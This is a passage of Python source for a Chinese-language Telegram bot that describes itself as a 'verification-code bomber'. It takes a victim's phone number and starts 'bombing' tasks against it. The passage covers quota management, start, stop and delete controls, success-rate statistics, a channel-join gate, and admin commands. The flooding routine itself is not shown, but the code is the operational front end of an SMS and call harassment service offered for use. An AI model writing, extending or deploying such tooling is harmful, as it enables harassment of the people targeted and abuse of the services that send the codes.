            reply_markup=await get_task_management_keyboard(user_id, user_task_ids)
        )
        async with _panel_messages_lock:
            panel_messages[user_id] = message.message_id
        return    
    
    if user_id in banned_users:
        await update.message.reply_text(
            "🚫 您已被禁止使用此机器人！\n如有疑问请联系管理员 @APl57"
        )
        return
    
    is_member = await check_channel_membership(user_id, context)
    
    if is_member:
        panel_text = format_panel_text(user_id)
        user_task_ids = user_tasks.get(user_id, [])
        message = await update.message.reply_text(
            panel_text,
            reply_markup=await get_task_management_keyboard(user_id, user_task_ids)
        )
        async with _panel_messages_lock:
            panel_messages[user_id] = message.message_id
    else:
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("📢 加入频道", url=f"https://t.me/{REQUIRED_CHANNEL.lstrip('@')}")],
            [InlineKeyboardButton("✅ 验证", callback_data="verify_membership")]
        ])
        
        await update.message.reply_text(
            "🔒 **请先加入频道才能使用机器人！**\n\n"
            f"请先加入我们的频道：{REQUIRED_CHANNEL}\n\n"
            "加入后点击下方「验证」按钮即可开始使用。\n\n"
            "💡 创作者: @APl57",
            reply_markup=keyboard,
            parse_mode="Markdown"
        )

async def verify_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """验证回调函数"""
    query = update.callback_query
    user_id = update.effective_user.id
    await query.answer()
    
    if user_id in banned_users:
        await query.edit_message_text(
            "🚫 您已被禁止使用此机器人！\n"
            "如有疑问请联系管理员 @APl57"
        )
        return
    
    is_member = await check_channel_membership(user_id, context)
    
    if is_member:
        panel_text = format_panel_text(user_id)
        user_task_ids = user_tasks.get(user_id, [])
        await query.edit_message_text(
            panel_text,
            reply_markup=await get_task_management_keyboard(user_id, user_task_ids)
        )
    else:
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("📢 加入频道", url=f"https://t.me/{REQUIRED_CHANNEL.lstrip('@')}")],
            [InlineKeyboardButton("🔄 重新验证", callback_data="verify_membership")]
        ])
        
        await query.edit_message_text(
            "❌ **验证失败**\n\n"
            f"您还未加入频道 {REQUIRED_CHANNEL}\n\n"
            "请先加入频道后再点击验证。",
            reply_markup=keyboard,
            parse_mode="Markdown"
        )

async def handle_secure_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """处理所有需要验证的按钮回调"""
    query = update.callback_query
    user = update.effective_user
    user_id = user.id
    await query.answer()
    
    data = query.data
    print_log(f"用户 {user_id} 点击按钮: {data}")
    
    if user_id in banned_users and user_id != ADMIN_ID:
        await query.edit_message_text(
            "🚫 您已被禁止使用此机器人！\n"
            "如有疑问请联系管理员 @APl57"
        )
        return
    
    if user_id != ADMIN_ID:
        is_member = await check_channel_membership(user_id, context)
        if not is_member:
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("📢 加入频道", url=f"https://t.me/{REQUIRED_CHANNEL.lstrip('@')}")],
                [InlineKeyboardButton("✅ 验证", callback_data="verify_membership")]
            ])
            await query.edit_message_text(
                "🔒 **请先加入频道才能使用机器人！**\n\n"
                f"请先加入我们的频道：{REQUIRED_CHANNEL}\n\n"
                "加入后点击下方「验证」按钮即可开始使用。",
                reply_markup=keyboard,
                parse_mode="Markdown"
            )
            return
    
    parts = data.split("_")
    if len(parts) < 2:
        await query.answer("无效操作", show_alert=True)
        return
    
    action_code = parts[0]
    token = parts[-1]
    
    if not await verify_session_token(user_id, token):
        print_log(f"⚠️ 用户 {user_id} token验证失败！可能是伪造请求", "WARNING")
        new_token = await generate_session_token(user_id)
        await query.edit_message_text(
            "❌ 安全验证失败！\n"
            "请重新打开面板操作。\n\n"
            "点击下方按钮刷新面板：",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 刷新面板", callback_data=f"rf_{new_token}")]
            ])
        )
        return
    
    if action_code == "rf":
        panel_text = format_panel_text(user_id)
        user_task_ids = user_tasks.get(user_id, [])
        await query.edit_message_text(
            panel_text,
            reply_markup=await get_task_management_keyboard(user_id, user_task_ids)
        )
        return
    
    elif action_code == "vl":
        if log_filename.exists():
            try:
                with open(log_filename, 'rb') as f:
                    await context.bot.send_document(
                        chat_id=user_id,
                        document=f,
                        filename=f"bomb_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt",
                        caption=f"📄 系统日志\n时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                    )
                print_log(f"已发送日志文件给用户 {user_id}")
                await query.edit_message_text(
                    "✅ 日志文件已发送！",
                    reply_markup=await get_task_management_keyboard(user_id, user_tasks.get(user_id, []))
                )
            except Exception as e:
                print_log(f"发送日志文件失败: {e}", "ERROR")
                await query.edit_message_text(
                    f"❌ 发送失败: {str(e)[:50]}",
                    reply_markup=await get_task_management_keyboard(user_id, user_tasks.get(user_id, []))
                )
        else:
            await query.edit_message_text(
                "❌ 日志文件不存在",
                reply_markup=await get_task_management_keyboard(user_id, user_tasks.get(user_id, []))
            )
        return
    
    elif action_code == "ds":
        user_task_ids = user_tasks.get(user_id, [])
        
        active_count = 0
        stopped_count = 0
        user_success = 0
        user_fail = 0
        
        for task_id in user_task_ids:
            task_data = active_tasks.get(task_id)
            if task_data:
                if task_data.is_running and not task_data.is_stopped:
                    active_count += 1
                elif task_data.is_stopped:
                    stopped_count += 1
                user_success += task_data.success_count
                user_fail += task_data.fail_count
        
        task_details = ""
        if user_task_ids:
            task_details = "\n\n📋 您的任务详情:\n"
            for idx, task_id in enumerate(user_task_ids, 1):
                task_data = active_tasks.get(task_id)
                if task_data:
                    display_phone = task_data.phone_number
                    if len(display_phone) > 15:
                        display_phone = f"{display_phone[:4]}...{display_phone[-6:]}"
                    status = task_data.get_display_status()
                    task_details += f"#{idx} {display_phone}\n"
                    task_details += f"  状态: {status}\n"
                    task_details += f"  成功: {task_data.success_count} | 失败: {task_data.fail_count}\n"
        
        stats_text = (
            "📊 您的详细统计信息\n"
            "──────────────────────\n"
            f"📟 系统状态: 在线\n"
            f"🔥 您的活跃任务: {active_count}/{MAX_TASKS_PER_USER}\n"
            f"⏸ 停止任务: {stopped_count}\n"
            f"📋 总任务数: {len(user_task_ids)}\n\n"
            f"📈 您的请求统计:\n"
            f"• 成功: {user_success} | 失败: {user_fail}\n"
        )
        
        if user_success + user_fail > 0:
            success_rate = (user_success/(user_success+user_fail)*100)
            stats_text += f"• 成功率: {success_rate:.1f}%\n\n"
        
        stats_text += (
            f"📊 全系统统计:\n"
            f"• 总请求: {stats['total_requests']}\n"
            f"• 成功: {stats['total_success']} | 失败: {stats['total_fails']}\n"
            f"⏰ 运行时间: {(datetime.now() - stats['start_time']).total_seconds()/3600:.1f} 小时\n\n"
            f"📁 数据目录: {DATA_DIR}\n"
            f"📄 当前日志: {log_filename.name}"
        )
        
        stats_text += task_details
        
        if len(stats_text) > 4000:
            stats_text = stats_text[:3500] + "\n\n... (内容过长，已截断)"
        
        await query.edit_message_text(
            stats_text,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔙 返回主菜单", callback_data=f"rf_{token}")]
            ])
        )
        return
    
    elif action_code == "aq":
        user_task_ids = user_tasks.get(user_id, [])
        active_count = 0
        for task_id in user_task_ids:
            task_data = active_tasks.get(task_id)
            if task_data and task_data.is_running and not task_data.is_stopped:
                active_count += 1
        
        if active_count >= MAX_TASKS_PER_USER:
            await query.edit_message_text(
                f"❌ 您的配额已满！\n当前活跃任务: {active_count}/{MAX_TASKS_PER_USER}\n请停止或删除任务后再添加",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔙 返回主菜单", callback_data=f"rf_{token}")]
                ])
            )
            return
        
        context.user_data['adding_task'] = True
        context.user_data['session_token'] = token
        
        await query.edit_message_text(
            "➕ 增加配额\n\n"
            "请输入目标手机号（格式：+8613800138000）:\n\n"
            "📝 示例：+861234567890\n"
            "输入 /cancel 取消操作"
        )
        return PHONE_NUMBER
    
    elif action_code == "sp":
        if len(parts) >= 2:
            task_id = parts[1]
            
            if task_id not in active_tasks:
                await query.answer("任务不存在", show_alert=True)
                return
            
            task_data = active_tasks[task_id]
            
            if task_data.user_id != user_id and user_id != ADMIN_ID:
                await query.answer("❌ 这不是您的任务！无法操作", show_alert=True)
                print_log(f"⚠️ 用户 {user_id} 试图停止不属于自己的任务 {task_id}", "WARNING")
                return
            
            await task_data.stop()
            print_log(f"用户 {user_id} 停止任务: {task_data.phone_number}")
            
            panel_text = format_panel_text(user_id)
            user_task_ids = user_tasks.get(user_id, [])
            await query.edit_message_text(
                panel_text,
                reply_markup=await get_task_management_keyboard(user_id, user_task_ids)
            )
            await context.bot.send_message(
                chat_id=user_id,
                text=f"⏸ 已停止: {task_data.phone_number}\n点击「启动」按钮可重新开始"
            )
        return
    
    elif action_code == "rs":
        if len(parts) >= 2:
            task_id = parts[1]
            
            if task_id not in active_tasks:
                await query.answer("任务不存在", show_alert=True)
                return
            
            task_data = active_tasks[task_id]
            
            if task_data.user_id != user_id and user_id != ADMIN_ID:
                await query.answer("❌ 这不是您的任务！无法操作", show_alert=True)
                print_log(f"⚠️ 用户 {user_id} 试图启动不属于自己的任务 {task_id}", "WARNING")
                return
            
            user_task_ids = user_tasks.get(user_id, [])
            active_count = 0
            for tid in user_task_ids:
                t = active_tasks.get(tid)
                if t and t.is_running and not t.is_stopped:
                    active_count += 1
            
            if active_count >= MAX_TASKS_PER_USER:
                await query.answer(f"您的配额已满！当前活跃: {active_count}/{MAX_TASKS_PER_USER}", show_alert=True)
                return
            
            await task_data.start()
            print_log(f"用户 {user_id} 重启任务: {task_data.phone_number}")
            
            panel_text = format_panel_text(user_id)
            user_task_ids = user_tasks.get(user_id, [])
            await query.edit_message_text(
                panel_text,
                reply_markup=await get_task_management_keyboard(user_id, user_task_ids)
            )
            await context.bot.send_message(
                chat_id=user_id,
                text=f"▶️ 已启动: {task_data.phone_number}\n轰炸继续进行中..."
            )
        return
    
    elif action_code == "dl":
        if len(parts) >= 2:
            task_id = parts[1]
            
            if task_id not in active_tasks:
                await query.answer("任务不存在", show_alert=True)
                return
            
            task_data = active_tasks[task_id]
            
            if task_data.user_id != user_id and user_id != ADMIN_ID:
                await query.answer("❌ 这不是您的任务！无法删除", show_alert=True)
                print_log(f"⚠️ 用户 {user_id} 试图删除不属于自己的任务 {task_id}", "WARNING")
                return
            
            if task_data.task and not task_data.task.done():
                task_data.task.cancel()
                try:
                    await task_data.task
                except asyncio.CancelledError:
                    pass
            
            if task_data.phone_number in phone_to_task_id:
                del phone_to_task_id[task_data.phone_number]
            
            if user_id in user_tasks and task_id in user_tasks[user_id]:
                user_tasks[user_id].remove(task_id)
                await save_user_tasks()
            
            del active_tasks[task_id]
            print_log(f"用户 {user_id} 删除任务: {task_data.phone_number}")
            
            panel_text = format_panel_text(user_id)
            user_task_ids = user_tasks.get(user_id, [])
            await query.edit_message_text(
                panel_text,
                reply_markup=await get_task_management_keyboard(user_id, user_task_ids)
            )
            await context.bot.send_message(
                chat_id=user_id,
                text=f"🗑️ 已删除: {task_data.phone_number}"
            )
        return

async def receive_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """接收手机号并开始轰炸"""
    phone_number = update.message.text.strip()
    user = update.effective_user
    user_id = user.id
    
    if not context.user_data.get('adding_task'):
        return ConversationHandler.END
    
    if user_id in banned_users and user_id != ADMIN_ID:
        await update.message.reply_text(
            "🚫 您已被禁止使用此机器人！\n"
            "如有疑问请联系管理员 @APl57"
        )
        return ConversationHandler.END
    
    if user_id != ADMIN_ID:
        is_member = await check_channel_membership(user_id, context)
        if not is_member:
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("📢 加入频道", url=f"https://t.me/{REQUIRED_CHANNEL.lstrip('@')}")],
                [InlineKeyboardButton("✅ 验证", callback_data="verify_membership")]
            ])
            await update.message.reply_text(
                "🔒 **请先加入频道才能使用机器人！**\n\n"
                f"请先加入我们的频道：{REQUIRED_CHANNEL}\n\n"
                "加入后点击下方「验证」按钮即可开始使用。",
                reply_markup=keyboard,
                parse_mode="Markdown"
            )
            return ConversationHandler.END
    
    print_log(f"用户 {user_id} 输入手机号: {phone_number}")
    
    if phone_number.startswith('/'):
        return ConversationHandler.END
    
    if not re.match(r'^\+\d{7,15}$', phone_number):
        await update.message.reply_text(
            "❌ 手机号格式错误！\n格式: +8613800138000\n\n请重新输入或输入 /cancel 取消"
        )
        return PHONE_NUMBER
    
    if phone_number in phone_to_task_id:
        existing_task_id = phone_to_task_id[phone_number]
        existing_task = active_tasks.get(existing_task_id)
        if existing_task and existing_task.user_id != user_id:
            await update.message.reply_text(
                f"⚠️ {phone_number} 正在被其他用户轰炸中！\n"
                "请使用不同的手机号。"
            )
            return PHONE_NUMBER
        elif existing_task and existing_task.user_id == user_id:
            await update.message.reply_text(f"⚠️ {phone_number} 已经在您的任务列表中！")
            await update_panel(user_id, context)
            context.user_data['adding_task'] = False
            return ConversationHandler.END
    
    user_task_ids = user_tasks.get(user_id, [])
    active_count = 0
    for task_id in user_task_ids:
        task_data = active_tasks.get(task_id)
        if task_data and task_data.is_running and not task_data.is_stopped:
            active_count += 1
    
    if active_count >= MAX_TASKS_PER_USER:
        await update.message.reply_text(
            f"❌ 您的配额已满！\n当前活跃任务: {active_count}/{MAX_TASKS_PER_USER}\n请停止或删除任务后再添加"
        )
        context.user_data['adding_task'] = False
        return ConversationHandler.END
    
    if user_id in user_usage:
        user_usage[user_id]["total_tasks"] = user_usage[user_id].get("total_tasks", 0) + 1
        user_usage[user_id]["last_active"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    else:
        user_usage[user_id] = {
            "first_name": user.first_name,
            "username": user.username,
            "last_active": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "total_tasks": 1
        }
    save_user_usage()
    
    task_id = generate_task_id()
    task_data = TaskData(task_id, phone_number, user_id, user_id)
    active_tasks[task_id] = task_data
    phone_to_task_id[phone_number] = task_id
    
    if user_id not in user_tasks:
        user_tasks[user_id] = []
    user_tasks[user_id].append(task_id)
    await save_user_tasks()
    await save_active_tasks()
    
    task = asyncio.create_task(bomb_phone_number(task_id, user_id, context))
    task_data.task = task
    
    print_log(f"用户 {user_id} 创建任务: {phone_number} (任务ID: {task_id})")
    
    await update_panel(user_id, context)
    
    await update.message.reply_text(
        f"✅ 已开始轰炸 {phone_number}\n\n"
        f"📊 您的配额: {active_count+1}/{MAX_TASKS_PER_USER}"
    )
    
    context.user_data['adding_task'] = False
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """取消操作"""
    user_id = update.effective_chat.id
    context.user_data['adding_task'] = False
    await update.message.reply_text("❌ 已取消")
    
    panel_text = format_panel_text(user_id)
    user_task_ids = user_tasks.get(user_id, [])
    token = await generate_session_token(user_id)
    message = await update.message.reply_text(
        panel_text,
        reply_markup=await get_task_management_keyboard(user_id, user_task_ids)
    )
    async with _panel_messages_lock:
        panel_messages[user_id] = message.message_id
    return ConversationHandler.END

# ==================== 会话处理器 ====================
def create_add_task_conversation():
    return ConversationHandler(
        entry_points=[CallbackQueryHandler(handle_secure_callback, pattern="^aq_.*$")],
        states={
            PHONE_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_phone)]
        },
        fallbacks=[
            CommandHandler("cancel", cancel),
            CommandHandler("start", start)
        ],
        allow_reentry=True,
        per_chat=False,
        per_user=True,
        per_message=False
    )

# ==================== 主函数 ====================
async def shutdown(application: Application):
    print_log("正在关闭机器人...", "WARNING")
    
    for task_id, task_data in list(active_tasks.items()):
        await task_data.stop()
        if task_data.task and not task_data.task.done():
            task_data.task.cancel()
    
    await asyncio.sleep(2)
    
    await save_user_tasks()
    await save_active_tasks()
    save_user_usage()
    save_banned_users()
    
    print_log("机器人已关闭", "INFO")

def main():
    global application
    
    print_log("=" * 70)
    print_log("💣 Telegram 验证码轰炸机启动 - Railway 部署版 v3.0")
    print_log(f"📁 数据目录: {DATA_DIR}")
    print_log(f"📁 日志目录: {LOG_DIR}")
    print_log(f"⚡ 用户最大并发: {MAX_TASKS_PER_USER}")
    print_log(f"⚡ 系统最大并发: {MAX_CONCURRENT_TASKS}")
    print_log(f"🔒 必需频道: {REQUIRED_CHANNEL}")
    print_log(f"👑 管理员ID: {ADMIN_ID}")
    print_log("=" * 70)
    
    load_banned_users()
    load_user_usage()
    load_user_tasks()
    
    orphan_tasks = []
    for task_id, task_data in active_tasks.items():
        if task_data.user_id not in user_tasks:
            orphan_tasks.append(task_id)
    
    for task_id in orphan_tasks:
        print_log(f"清理孤儿任务: {task_id}", "WARNING")
        if active_tasks[task_id].task and not active_tasks[task_id].task.done():
            active_tasks[task_id].task.cancel()
        if active_tasks[task_id].phone_number in phone_to_task_id:
            del phone_to_task_id[active_tasks[task_id].phone_number]
        del active_tasks[task_id]
    
    try:
        application = Application.builder().token(BOT_TOKEN).build()
        
        # 管理员命令
        application.add_handler(CommandHandler("gfh", gfh_command))
        application.add_handler(CommandHandler("gfd", gfd_command))
        application.add_handler(CommandHandler("unfd", unfd_command))
        application.add_handler(CommandHandler("gfhl", gfhl_command))
        application.add_handler(CommandHandler("stats_all", stats_all_command))
        application.add_handler(CommandHandler("dz", dz_command))
        application.add_handler(CommandHandler("tz", tz_command))
        
        # 添加任务会话处理器
        application.add_handler(create_add_task_conversation())
        
        # 基础命令
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CallbackQueryHandler(verify_callback, pattern="^verify_membership$"))
        application.add_handler(CallbackQueryHandler(handle_secure_callback, pattern="^(rf|vl|ds|sp_|rs_|dl_).*$"))
        
        print_log("✅ 机器人启动成功，开始轮询...")
        application.run_polling(allowed_updates=Update.ALL_TYPES)
        
    except Exception as e:
        print_log(f"❌ 启动失败: {str(e)}", "ERROR")
        import traceback
        traceback.print_exc()
        raise

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print_log("用户手动停止程序")
    except Exception as e:
        print_log(f"程序异常: {str(e)}", "ERROR")
        import traceback
        traceback.print_exc()